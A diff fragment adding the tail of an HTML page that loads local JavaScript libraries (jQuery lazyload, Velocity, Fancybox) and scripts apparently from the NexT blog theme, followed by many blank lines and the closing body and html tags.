+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
